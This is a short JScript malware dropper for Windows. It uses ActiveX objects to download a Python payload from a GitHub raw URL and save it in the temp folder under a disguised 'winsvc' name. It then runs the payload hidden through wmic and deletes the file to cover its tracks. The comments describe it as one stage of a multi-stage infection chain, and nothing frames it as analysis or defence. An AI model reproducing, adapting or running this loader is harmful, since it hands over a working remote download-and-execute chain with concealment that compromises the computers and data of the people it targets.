var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var temp = fso.GetSpecialFolder(2);
var xmlhttp = new ActiveXObject("MSXML2.XMLHTTP");

// Download and execute Stage 3 (Python script)
xmlhttp.open("GET", "https://raw.githubusercontent.com/redkoala2/google-browser/main/test_webhook_2.pyw", false);
xmlhttp.send();
var pythonCode = xmlhttp.responseText;

// Create file with random name in legit Windows directory
var fileName = "winsvc" + Math.floor(Math.random()*10000) + ".pyw";
var filePath = temp + "\\" + fileName;
var ts = fso.CreateTextFile(filePath, true);
ts.Write(pythonCode);
ts.Close();

// Execute via Windows Management Instrumentation (most trusted)
shell.Run("wmic process call create \"pythonw.exe '" + filePath + "'\"", 0, true);

// Cleanup - delete the file after execution starts
shell.Run("cmd /c timeout 3 && del \"" + filePath + "\"", 0, false);
